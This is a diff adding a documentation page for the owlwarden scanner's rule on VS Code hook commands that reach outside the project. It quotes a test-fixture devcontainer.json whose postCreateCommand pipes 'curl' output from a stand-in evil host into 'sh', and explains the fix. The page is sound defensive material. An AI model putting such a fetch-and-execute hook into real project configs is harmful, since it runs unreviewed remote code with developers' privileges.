@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Fix agent-hook-untrusted-command in VS Code — owlwarden</title>
+<meta name="description" content="Hook command reaches outside the project in VS Code. The vulnerable pattern, the corrected code, the CWE mapping, and one command to check your own repository.">
+<link rel="canonical" href="https://suthat.github.io/owlwarden/rules/agent-hook-untrusted-command/vscode/">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="theme-color" content="#fbfaf8">
+
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="owlwarden">
+<meta property="og:title" content="Fix hook command reaches outside the project in VS Code">
+<meta property="og:description" content="Hook command reaches outside the project in VS Code. The vulnerable pattern, the corrected code, the CWE mapping, and one command to check your own repository.">
+<meta property="og:url" content="https://suthat.github.io/owlwarden/rules/agent-hook-untrusted-command/vscode/">
+<meta property="og:image" content="https://suthat.github.io/owlwarden/og.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="owlwarden — offline security scanner for Node web apps and AI coding agents">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Fix hook command reaches outside the project in VS Code">
+<meta name="twitter:description" content="Hook command reaches outside the project in VS Code. The vulnerable pattern, the corrected code, the CWE mapping, and one command to check your own repository.">
+<meta name="twitter:image" content="https://suthat.github.io/owlwarden/og.jpg">
+
+<link rel="icon" type="image/png" href="../../../favicon.png">
+<link rel="stylesheet" href="../../../styles.css?v=1.1.0">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://suthat.github.io/owlwarden/rules/agent-hook-untrusted-command/vscode/#breadcrumbs",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "owlwarden",
+          "item": "https://suthat.github.io/owlwarden/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Rules",
+          "item": "https://suthat.github.io/owlwarden/rules/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "agent-hook-untrusted-command",
+          "item": "https://suthat.github.io/owlwarden/rules/agent-hook-untrusted-command/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 4,
+          "name": "VS Code",
+          "item": "https://suthat.github.io/owlwarden/rules/agent-hook-untrusted-command/vscode/"
+        }
+      ]
+    },
+    {
+      "@type": "TechArticle",
+      "headline": "Fix hook command reaches outside the project in VS Code",
+      "description": "A hook, task, or lifecycle command does something a formatter would not: pipes a network fetch into a shell, decodes and executes, reads a credential store, writes outside the project root, or launches a package resolved at run time. The trigger does not matter here — the command does.",
+      "proficiencyLevel": "Beginner",
+      "dependencies": "VS Code",
+      "isPartOf": {
+        "@type": "TechArticle",
+        "@id": "#rule"
+      },
+      "about": [
+        {
+          "@type": "Thing",
+          "name": "CWE-78",
+          "url": "https://cwe.mitre.org/data/definitions/78.html"
+        }
+      ]
+    },
+    {
+      "@type": "HowTo",
+      "name": "Fix hook command reaches outside the project in VS Code",
+      "totalTime": "PT2M",
+      "step": [
+        {
+          "@type": "HowToStep",
+          "name": "Find it",
+          "text": "Run npx owlwarden scan in your VS Code project."
+        },
+        {
+          "@type": "HowToStep",
+          "name": "Fix it",
+          "text": "Use a task that runs a committed script, with `args` as a list rather than a shell string — a list is not re-parsed by a shell, so `|` and `;` in an argument stay data."
+        },
+        {
+          "@type": "HowToStep",
+          "name": "Confirm it",
+          "text": "Run npx owlwarden scan again; the agent-hook-untrusted-command finding is gone."
+        }
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<a class="skip-link" href="#main-content">Skip to content</a>
+
+<header class="site-header">
+  <a class="wordmark" href="../../../">
+    <span aria-hidden="true">◉ᴥ◉</span>
+    <span>owlwarden</span>
+  </a>
+  <nav aria-label="Primary">
+    <a href="../../../rules/">Rules</a>
+    <a href="../../../agent-config-security/">Agent config</a>
+    <a href="../../../vet/">vet</a>
+    <a href="../../../owasp/">Coverage</a>
+    <a href="https://github.com/suthat/owlwarden" rel="noopener">GitHub</a>
+  </nav>
+</header>
+
+<nav class="breadcrumbs" aria-label="Breadcrumb">
+  <ol>
+    <li><a href="../../../">owlwarden</a></li>
+    <li><a href="../../../rules/">Rules</a></li>
+    <li><a href="../../../rules/agent-hook-untrusted-command/">agent-hook-untrusted-command</a></li>
+    <li aria-current="page">VS Code</li>
+  </ol>
+</nav>
+
+<main id="main-content">
+<h1>Fix hook command reaches outside the project in VS Code</h1>
+
+<p class="lede">A hook, task, or lifecycle command does something a formatter would not: pipes a network fetch into a shell, decodes and executes, reads a credential store, writes outside the project root, or launches a package resolved at run time. The trigger does not matter here — the command does.</p>
+
+<p>
+  <span class="chip chip-high">high</span> <span class="chip chip-likely">likely</span>
+  <span class="chip chip-scope">VS Code</span>
+  <a href="https://cwe.mitre.org/data/definitions/78.html" rel="noopener">CWE-78</a>
+  
+   · <a href="../../../asi/">ASI ASI05</a>
+</p>
+
+<h2>The vulnerable pattern in VS Code</h2>
+<div class="transcript"><span class="sev-high">HIGH</span>  <span class="conf">likely</span>  <span class="dim">active</span>  Hook command reaches outside the project  <span class="dim">ASI05</span>
+<span class="dim">.devcontainer/devcontainer.json:3:25</span>
+
+<span class="dim">1 │</span> {
+<span class="dim">2 │</span>   &quot;image&quot;: &quot;mcr.microsoft.com/devcontainers/javascript-node:20&quot;,
+<span class="dim">3 │</span>   &quot;postCreateCommand&quot;: &quot;curl -fsSL https://get.evil.invalid | sh&quot;
+<span class="dim">  │ </span>                        <span class="mark">~~~~ pipes a network fetch into a shell</span>
+<span class="dim">4 │</span> }</div>
+<p>
+  This is a real finding from the VS Code fixture in the owlwarden test
+  suite.
+  Whatever that URL serves at the moment the hook runs is executed with the developer&#39;s privileges. Nobody reviews it, because there is nothing checked in to review. The command runs from `postCreateCommand`, which anyone with a pull request can edit.
+</p>
+
+<h2>The corrected configuration</h2>
+<p>Use a task that runs a committed script, with `args` as a list rather than a shell string — a list is not re-parsed by a shell, so `|` and `;` in an argument stay data.</p>
+<pre class="code"><code class="language-json">// .vscode/tasks.json
+{ &quot;command&quot;: &quot;node&quot;, &quot;args&quot;: [&quot;scripts/setup.mjs&quot;] }</code></pre>
+
+<h3>If you are not using VS Code</h3>
+<p>Replace the command with a script committed in the repository, invoked by path, that a reviewer can read in the same pull request. If it needs a package, add it to `devDependencies` and run it through the package manager&#39;s `exec`, so the lockfile pins what runs.</p>
+
+<h2>Check your own repository</h2>
+<pre class="code"><code class="language-bash">npx owlwarden scan
+npx owlwarden explain agent-hook-untrusted-command</code></pre>
+<p>
+  Runs entirely on your machine — <a href="../../../offline/">no account, no
+  telemetry, no network unless you ask</a>. In CI, <a href="../../../ci/">SARIF
+  uploads to code scanning</a> and the exit code is the gate.
+</p>
+
+<h2>Other VS Code checks</h2>
+<ul class="cards">
+  <li><a href="../../agent-config-env-redirect/vscode/">
+    <span class="name">agent-config-env-redirect</span>
+    <span class="blurb"><span class="chip chip-high">high</span> Repository config redirects the agent&#39;s API traffic</span>
+  </a></li>
+  <li><a href="../../agent-config-loader-script/vscode/">
+    <span class="name">agent-config-loader-script</span>
+    <span class="blurb"><span class="chip chip-high">high</span> Executable script inside an agent or editor config directory</span>
+  </a></li>
+  <li><a href="../../agent-config-secret-reachable/vscode/">
+    <span class="name">agent-config-secret-reachable</span>
+    <span class="blurb"><span class="chip chip-high">high</span> Repository config puts credentials in reach of a repository-controlled command</span>
+  </a></li>
+  <li><a href="../../agent-hook-autoexec/vscode/">
+    <span class="name">agent-hook-autoexec</span>
+    <span class="blurb"><span class="chip chip-high">high</span> Repository config executes a command when the workspace is opened</span>
+  </a></li>
+  <li><a href="../../agent-mcp-unpinned-remote/vscode/">
+    <span class="name">agent-mcp-unpinned-remote</span>
+    <span class="blurb"><span class="chip chip-medium">medium</span> MCP server declaration resolves code at run time</span>
+  </a></li>
+  <li><a href="../../agent-permission-wildcard/vscode/">
+    <span class="name">agent-permission-wildcard</span>
+    <span class="blurb"><span class="chip chip-medium">medium</span> Repository config pre-approves a broad tool permission</span>
+  </a></li>
+</ul>
+
+<p>
+  <a href="../">agent-hook-untrusted-command for every agent host</a> ·
+  <a href="../../">All rules</a> ·
+  <a href="../../../">owlwarden</a>
+</p>
+
+</main>
+
+<footer class="site-footer">
+  <p>
+    <strong>owlwarden 1.1.0</strong> — offline security scanner for Node web apps
+    and AI coding agents. No account, no telemetry, no network unless you ask.
+  </p>
+  <nav aria-label="Footer">
+    <a href="../../../rules/">All rules</a>
+    <a href="../../../owasp/">OWASP coverage</a>
+    <a href="../../../asi/">ASI coverage</a>
+    <a href="../../../offline/">Offline</a>
+    <a href="../../../ci/">CI</a>
+    <a href="../../../mcp/">MCP</a>
+    <a href="https://github.com/suthat/owlwarden/blob/main/RULES.md" rel="noopener">RULES.md</a>
+    <a href="https://www.npmjs.com/package/owlwarden" rel="noopener">npm</a>
+  </nav>
+  <p class="licence">MIT OR Apache-2.0. <code>npx owlwarden scan</code></p>
+</footer>
+</body>
+</html>
